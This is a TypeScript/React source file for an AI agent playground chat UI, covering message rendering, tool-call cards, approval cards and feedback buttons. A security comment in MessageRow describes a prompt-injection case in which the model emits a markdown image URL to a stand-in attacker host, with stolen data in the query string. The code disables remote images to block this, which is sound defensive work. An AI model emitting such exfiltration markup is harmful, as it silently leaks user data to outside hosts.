/** Presentation layer for the playground chat: plain-data components with no
 * dependency on `useChat` or any chat runtime. Everything here renders from
 * a `PlaygroundMessage[]` (or a single message) plus callbacks, so the same
 * components can later be driven by a canned script (a planned
 * marketing/ads demo) with zero chat runtime behind them.
 *
 * ZERO runtime imports from `ai` or `@ai-sdk/react` — only type-only ones,
 * which are erased at build time. That is why the part guards below are
 * hand-written string checks rather than the SDK's `isToolUIPart`/`getToolName`
 * helpers: those are runtime exports, and importing one would drag the whole
 * chat runtime into a bundle whose entire point is not having it. The checks
 * are the same one-liners the SDK uses. `playground.tsx` (the container, which
 * DOES import `useChat`) composes these.
 *
 * Every part rendered here is a STANDARD assistant-message part. There is no
 * playground-specific stream protocol any more: tool activity, the pause for
 * approval, the approved run's result and a denial are all states of one
 * `tool-<name>` part, which is what the agent runtime emits natively. */

import { memo } from "react";
import type { DynamicToolUIPart, ToolUIPart, UIMessage } from "ai";
import { renderAgentPart, type AgentDataParts } from "./agent-parts";
import { internalToolIcon, toolDisplayName } from "./agent-tool-copy";
import { RefreshCcwIcon, ThumbsDownIcon, ThumbsUpIcon } from "lucide-react";

import {
  Message,
  MessageAction,
  MessageActions,
  MessageContent,
  MessageResponse,
} from "@/components/ai-elements/message";
import {
  Tool,
  ToolContent,
  ToolHeader,
  ToolInput,
  ToolOutput,
} from "@/components/ai-elements/tool";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
// Value import (not `import type`) — the string is compared at runtime. The
// module is dependency-free (a console.error and two exports), so pulling it
// into the client bundle costs nothing and drags in no server-only API.
import { GENERIC_ERROR_MESSAGE as SERVER_GENERIC_ERROR } from "@/lib/errors";

/* -------------------------------------------------------------------------- */
/* Wire types                                                                  */
/* -------------------------------------------------------------------------- */

/** The message shape flowing through `useChat` — and, equally, the shape the
 * presentation components below accept. Anything that can produce a
 * `PlaygroundMessage[]` (a live chat, a canned script) can drive the UI.
 *
 * NO LONGER THE SDK'S PLAIN `UIMessage`. It carries the agent's own data-part
 * map, because the agent now puts things in the thread that are neither text
 * nor a tool call: a connect control, the config block, account state. That
 * widening is the deliberate, bounded cost of the data-part approach, and it
 * is paid exactly here, once, with a named type. See `agent-parts.tsx` for
 * what the kinds are and why they are parts rather than rows. */
export type PlaygroundMessage = UIMessage<unknown, AgentDataParts>;

export type PlaygroundMessagePart = PlaygroundMessage["parts"][number];

/** A tool invocation part, in either of the two shapes the SDK produces.
 *
 * Both are handled on purpose. Tools resolved through MCP arrive with
 * `dynamic: false`, so they assemble as `tool-<name>` — the case that actually
 * occurs today, and the one the previous version of this file did NOT match
 * (it matched `dynamic-tool` only, which renders nothing at all while the rest
 * of the chat streams perfectly: a silent blank where a tool card belongs).
 * `dynamic-tool` stays supported because tolerating both costs one branch and
 * the failure mode of guessing wrong is invisible. */
export type AnyToolPart = ToolUIPart | DynamicToolUIPart;

export type FeedbackState = "idle" | "down-pending" | "sending" | "thanks";

/** How large the message text runs.
 *
 * `xs` is the embedded widget on the dashboard, where the chat is one block
 * among several and reads as a preview. `sm` is the full-page Agent, where the
 * thread is the only thing on screen and 12px prose in a centred column reads
 * as a widget that got stretched. Only the message body scales — tool cards,
 * confirm cards and the actions row stay metadata-sized in both. */
export type MessageTextSize = "xs" | "sm";

const MESSAGE_TEXT_CLASS: Record<MessageTextSize, string> = {
  xs: "text-xs",
  sm: "text-sm",
};

/** The playground's canonical "no useful detail" copy. Also the message the
 * transport throws for transport-level failures, so that the bubble can render
 * `error.message` verbatim (preserving the route's own actionable wording)
 * without ever exposing an internal sentinel. */
export const GENERIC_ERROR = "Something went wrong. Please try again.";

/** Resolve the error-bubble text.
 *
 * A stream `error` chunk reaches us as `new Error(chunk.errorText)`, so
 * `error.message` is whatever the route wrote. Two kinds arrive:
 *
 *  - Actionable, server-authored copy, which tells the user exactly what to do
 *    and must survive verbatim.
 *  - `logAndGenericError`'s placeholder, which carries no more information
 *    than our own copy but is worded differently. Showing it would mean the
 *    product has two different "generic error" strings depending on whether
 *    the failure happened before or during the stream.
 *
 * So: pass actionable text through, and normalise everything else — client- or
 * server-generated — to `GENERIC_ERROR`.
 *
 * Exported for `playground.test.ts`, which is the only assertion anywhere on
 * this product's user-facing copy — it exists because this exact defect
 * (two "generic" strings silently diverging) shipped twice, invisible to
 * tsc/build/tests both times. */
export function errorBubbleText(error: Error | undefined): string {
  const serverMessage = error?.message?.trim();
  return !serverMessage || serverMessage === SERVER_GENERIC_ERROR
    ? GENERIC_ERROR
    : serverMessage;
}

/* -------------------------------------------------------------------------- */
/* Pure helpers                                                                */
/* -------------------------------------------------------------------------- */

/** Whether a message part is a tool invocation, in either shape.
 *
 * The `tool-` prefix test is the whole point of this module's rewrite: no other
 * part type in the SDK's vocabulary starts with it (`text`, `reasoning*`,
 * `source-*`, `file`, `data-*`, `step-start`, `custom`, `dynamic-tool`), so the
 * prefix is unambiguous. */
export function isToolPart(part: PlaygroundMessagePart): part is AnyToolPart {
  return part.type === "dynamic-tool" || part.type.startsWith("tool-");
}

/** The tool's name, wherever this part shape keeps it. */
export function toolPartName(part: AnyToolPart): string {
  return part.type === "dynamic-tool"
    ? part.toolName
    : part.type.slice("tool-".length);
}

/** The approval id this part is waiting on, if it is waiting on one.
 *
 * ⚠️ The returned string is a SERVER-MINTED CREDENTIAL and must be handed back
 * byte-for-byte. It embeds a run id that carries its owner in an HMAC the
 * server verifies in constant time, so trimming, re-encoding, splitting or
 * regenerating any part of it makes the user unable to approve their own write
 * (the server answers 403). Read it, pass it, never touch it. */
export function pendingApprovalId(
  part: PlaygroundMessagePart
): string | undefined {
  return isToolPart(part) && part.state === "approval-requested"
    ? part.approval.id
    : undefined;
}

/** Whether any message is holding the conversation open on a decision. */
export function hasPendingApproval(messages: PlaygroundMessage[]): boolean {
  return messages.some((message) =>
    message.parts.some((part) => pendingApprovalId(part) !== undefined)
  );
}

/** MCP tool names arrive namespaced as `<slug>__<tool>`; only the tail is
 * meaningful to a user reading a confirmation card or a tool chip. */
export function shortToolName(name: string): string {
  return name.split("__").pop() || name;
}

/** Compact one-line summary of a pending write's arguments, shown on the
 * confirmation card so the user sees what will actually run before approving.
 *
 * Serialized with spaces at every structural boundary (indent-then-collapse,
 * so commas inside string VALUES are untouched) — paired with `break-words`
 * on the card, lines wrap between tokens and a value like a dollar amount is
 * never split mid-number, which reads as a rendering fault exactly where the
 * user is deciding whether to trust a write. */
export function summarizeArgs(input: unknown): string {
  let s: string;
  try {
    s = JSON.stringify(input ?? {}, null, 1)?.replace(/\n\s*/g, " ") ?? "{}";
  } catch {
    // A tool input that will not serialize is a bug at the tool, not a reason
    // to render nothing where the user expects to see what they are approving.
    s = "{}";
  }
  return s.length > 160 ? `${s.slice(0, 159)}…` : s;
}

export function messageText(message: PlaygroundMessage): string {
  return message.parts
    .filter((part) => part.type === "text")
    .map((part) => part.text)
    .join("");
}

/* -------------------------------------------------------------------------- */
/* Presentation layer                                                          */
/*                                                                             */
/* Everything below renders from plain UIMessage-shaped data plus callbacks.   */
/* None of it touches useChat — the same components can later be driven by a   */
/* canned script (marketing demo) with no chat runtime behind them.            */
/* -------------------------------------------------------------------------- */

/** One tool invocation, at whatever stage it has reached.
 *
 * DENIED VS NEVER-RAN, which used to be one conflated flag on a custom part,
 * is now simply the part's own state and needs nothing from us: the runtime
 * moves a refused call to `output-denied` ("Denied"), while a call that was
 * approved but whose turn ended before it produced anything stays at
 * `approval-responded` ("Responded") and one that was never decided stays at
 * `approval-requested` ("Awaiting Approval"). Three distinct badges, from the
 * standard part, per call rather than per batch. */
export function ToolCard({ part }: { part: AnyToolPart }) {
  const name = shortToolName(toolPartName(part));
  // Internal gateway tools show what happened in the user's words and wear a
  // per-action glyph; everything else keeps its literal name and its derived
  // mark (service brand icon, wrench fallback). The split and its reasons
  // live in agent-tool-copy.ts (SCRUM-100).
  const display = toolDisplayName(name);
  const InternalIcon = internalToolIcon(name);
  const icon = InternalIcon ? (
    <InternalIcon className="size-4 text-muted-foreground" />
  ) : undefined;
  return (
    <Tool className="mb-0 text-xs">
      {/* `title` overrides the header's own name derivation, which would
          otherwise show the full `<slug>__<tool>` type. The two branches exist
          because the header's props are a discriminated union on `type`. */}
      {part.type === "dynamic-tool" ? (
        <ToolHeader
          icon={icon}
          state={part.state}
          title={display}
          toolName={name}
          type="dynamic-tool"
        />
      ) : (
        <ToolHeader icon={icon} state={part.state} title={display} type={part.type} />
      )}
      <ToolContent>
        <ToolInput input={part.input ?? {}} />
        <ToolOutput errorText={part.errorText} output={part.output} />
      </ToolContent>
    </Tool>
  );
}

export interface ConfirmCardProps {
  /** Server-minted, opaque, and passed back UNCHANGED — see
   * {@link pendingApprovalId}. */
  approvalId: string;
  toolName: string;
  input: unknown;
  /** Approve/Deny are locked while a request is in flight. */
  disabled: boolean;
  onDecide: (approvalId: string, approved: boolean) => void;
}

export function ConfirmCard({
  approvalId,
  toolName,
  input,
  disabled,
  onDecide,
}: ConfirmCardProps) {
  return (
    <div className="rounded-2xl border border-amber-300 bg-amber-50 px-4 py-3 text-xs">
      <p className="font-medium text-amber-900">
        Approve this action before it runs?
      </p>
      <p className="mt-2 text-amber-800">
        <span className="font-mono font-medium">{shortToolName(toolName)}</span>
        {/* overflow-wrap:anywhere (not break-words): identical line breaking,
            but long unbreakable tokens (file ids, URLs) also stop inflating
            min-content width, so a grid/flex ancestor can't be pushed wider
            than its column by this card. */}
        <span className="text-amber-700 [overflow-wrap:anywhere]">
          {" · "}
          {summarizeArgs(input)}
        </span>
      </p>
      <div className="mt-3 flex gap-2">
        <Button
          disabled={disabled}
          onClick={() => onDecide(approvalId, true)}
          size="xs"
        >
          Approve &amp; run
        </Button>
        <Button
          className="border-amber-300 bg-transparent text-amber-900 hover:bg-amber-100"
          disabled={disabled}
          onClick={() => onDecide(approvalId, false)}
          size="xs"
          variant="outline"
        >
          Deny
        </Button>
      </div>
    </div>
  );
}

export interface FeedbackControlsProps {
  messageId: string;
  state: FeedbackState;
  comment: string;
  onRate: (messageId: string, rating: "up" | "down") => void;
  onCommentChange: (messageId: string, comment: string) => void;
  onSendComment: (messageId: string) => void;
}

function FeedbackControls({
  messageId,
  state,
  comment,
  onRate,
  onCommentChange,
  onSendComment,
}: FeedbackControlsProps) {
  if (state === "thanks") {
    return (
      <span className="text-[11px] text-muted-foreground">
        Thanks for the feedback
      </span>
    );
  }

  return (
    <>
      <MessageAction
        disabled={state === "sending"}
        label="Good response"
        onClick={() => onRate(messageId, "up")}
        tooltip="Good response"
      >
        <ThumbsUpIcon className="size-3.5" />
      </MessageAction>
      <MessageAction
        disabled={state === "sending"}
        label="Bad response"
        onClick={() => onRate(messageId, "down")}
        tooltip="Bad response"
      >
        <ThumbsDownIcon className="size-3.5" />
      </MessageAction>
      {state === "down-pending" && (
        <span className="flex items-center gap-1.5">
          <Input
            className="h-7 w-56 text-[11px]"
            onChange={(e) => onCommentChange(messageId, e.target.value)}
            placeholder="What went wrong? (optional)"
            value={comment}
          />
          <Button onClick={() => onSendComment(messageId)} size="xs" variant="outline">
            Send
          </Button>
        </span>
      )}
    </>
  );
}

interface MessageRowProps {
  message: PlaygroundMessage;
  /** Whether this is the last message in the list — gates the Regenerate
   * action, which only ever applies to the most recent turn. */
  isLast: boolean;
  /** Whether to show the actions row (regenerate/feedback) under this
   * message at all — computed by the caller from completeness + error state,
   * since those are list-wide concerns this row doesn't need to know about. */
  showActions: boolean;
  /** A request is in flight — confirm buttons and regenerate are locked. */
  busy: boolean;
  /** True while an unresolved approval gates the conversation. */
  awaitingConfirm: boolean;
  /** Message-body scale. A constant per surface, so `memo` still bails.
   * Optional so the scripted demo and any other direct caller keep the
   * embedded widget's size without restating it. */
  textSize?: MessageTextSize;
  onDecide: ConfirmCardProps["onDecide"];
  onRegenerate: () => void;
  feedback: Record<string, FeedbackState>;
  comments: Record<string, string>;
  onRate: FeedbackControlsProps["onRate"];
  onCommentChange: FeedbackControlsProps["onCommentChange"];
  onSendComment: FeedbackControlsProps["onSendComment"];
}

/** One row of the message list, memoized so a streamed token only re-renders
 * the message it belongs to. `useChat` deliberately keeps non-streaming
 * `messages` entries referentially identical (`replaceMessage` preserves
 * `slice(0,i)`/`slice(i+1)`), so as long as every prop here is stable when
 * its value hasn't changed, `memo` bails on the other N-1 rows per token
 * instead of re-rendering the whole list. */
export const MessageRow = memo(function MessageRow({
  message,
  isLast,
  showActions,
  busy,
  awaitingConfirm,
  textSize = "xs",
  onDecide,
  onRegenerate,
  feedback,
  comments,
  onRate,
  onCommentChange,
  onSendComment,
}: MessageRowProps) {
  const bodyClass = MESSAGE_TEXT_CLASS[textSize];
  return (
    // The rows own the conversation's vertical rhythm (rather than the list
    // container), so every surface that renders them — dashboard playground,
    // landing demo — gets the same turn-by-turn spacing.
    <Message className="mt-5 first:mt-0" from={message.role}>
      <MessageContent className={`gap-3 ${bodyClass}`}>
        {message.parts.map((part, partIndex) => {
          const key = `${message.id}-${partIndex}`;
          if (part.type === "text") {
            return (
              // SECURITY: this playground deliberately feeds untrusted
              // third-party content (emails, documents, tickets) to the model
              // and renders the model's output as markdown. Streamdown
              // defaults BOTH allowlists to ["*"], so a successful prompt
              // injection could emit
              // `![](https://attacker.example/x.png?d=<stolen>)` and the
              // browser would silently GET an attacker host with user data in
              // the query string — no click required. So: no remote images at
              // all, and links only if they are https (the system prompt asks
              // the model to include verification links to what it created,
              // and those must stay clickable). Do not widen these.
              <MessageResponse
                allowedImagePrefixes={[]}
                allowedLinkPrefixes={["https://"]}
                className={bodyClass}
                key={key}
              >
                {part.text}
              </MessageResponse>
            );
          }
          if (isToolPart(part)) {
            const approvalId = pendingApprovalId(part);
            return (
              // The confirm card's gap matches the list's part gap (gap-3),
              // as an explicit margin on its own wrapper — NOT space-y on
              // the parent: space-y puts its margin on the ToolCard, whose
              // mb-0 silently cancels it.
              <div key={key}>
                <ToolCard part={part} />
                {/* The confirm card is bound to the SAME part: an approval
                    request is a state of the tool call, not a message of its
                    own, so the card appears under the tool it gates and
                    disappears the moment the part moves on. */}
                {approvalId !== undefined && (
                  <div className="mt-3">
                    <ConfirmCard
                      approvalId={approvalId}
                      disabled={busy}
                      input={part.input}
                      onDecide={onDecide}
                      toolName={toolPartName(part)}
                    />
                  </div>
                )}
              </div>
            );
          }
          // One branch for every data part there will ever be. The kinds and
          // their renderers live in agent-parts.tsx; this asks once and does
          // not grow when a fourth is added.
          const agentPart = renderAgentPart(
            part.type,
            (part as { data?: unknown }).data
          );
          if (agentPart !== null) return <div key={key}>{agentPart}</div>;
          return null;
        })}
      </MessageContent>

      {showActions && (
        <MessageActions>
          {isLast && (
            <MessageAction
              disabled={awaitingConfirm || busy}
              label="Regenerate"
              onClick={onRegenerate}
              tooltip="Regenerate"
            >
              <RefreshCcwIcon className="size-3.5" />
            </MessageAction>
          )}
          <FeedbackControls
            comment={comments[message.id] ?? ""}
            messageId={message.id}
            onCommentChange={onCommentChange}
            onRate={onRate}
            onSendComment={onSendComment}
            state={feedback[message.id] ?? "idle"}
          />
        </MessageActions>
      )}
    </Message>
  );
});

export interface MessageListProps {
  messages: PlaygroundMessage[];
  /** A request is in flight — confirm buttons and regenerate are locked. */
  busy: boolean;
  /** Whether the final message in the list has finished streaming. Earlier
   * messages are complete by construction. */
  lastMessageComplete: boolean;
  /** Assistant messages whose turn ended in an error; they get no feedback UI. */
  erroredIds: ReadonlySet<string>;
  /** True while an unresolved approval gates the conversation. */
  awaitingConfirm: boolean;
  /** Message-body scale. Defaults to the embedded widget's size, so a caller
   * that does not care keeps exactly what it had. */
  textSize?: MessageTextSize;
  onDecide: ConfirmCardProps["onDecide"];
  onRegenerate: () => void;
  feedback: Record<string, FeedbackState>;
  comments: Record<string, string>;
  onRate: FeedbackControlsProps["onRate"];
  onCommentChange: FeedbackControlsProps["onCommentChange"];
  onSendComment: FeedbackControlsProps["onSendComment"];
}

export function MessageList({
  messages,
  busy,
  lastMessageComplete,
  erroredIds,
  awaitingConfirm,
  textSize = "xs",
  onDecide,
  onRegenerate,
  feedback,
  comments,
  onRate,
  onCommentChange,
  onSendComment,
}: MessageListProps) {
  return (
    <>
      {messages.map((message, index) => {
        const isLast = index === messages.length - 1;
        const complete = !isLast || lastMessageComplete;
        // A turn suspended on an approval is "complete" by every signal the
        // chat runtime has — the stream really did close, with no `finish`
        // part, and the status really is `ready`. It is not finished, though,
        // so the last message gets no regenerate/feedback row until the user
        // decides.
        const showActions =
          message.role === "assistant" &&
          complete &&
          !erroredIds.has(message.id) &&
          !(isLast && awaitingConfirm);

        return (
          <MessageRow
            awaitingConfirm={awaitingConfirm}
            busy={busy}
            comments={comments}
            feedback={feedback}
            isLast={isLast}
            key={message.id}
            message={message}
            onCommentChange={onCommentChange}
            onDecide={onDecide}
            onRate={onRate}
            onRegenerate={onRegenerate}
            onSendComment={onSendComment}
            showActions={showActions}
            textSize={textSize}
          />
        );
      })}
    </>
  );
}
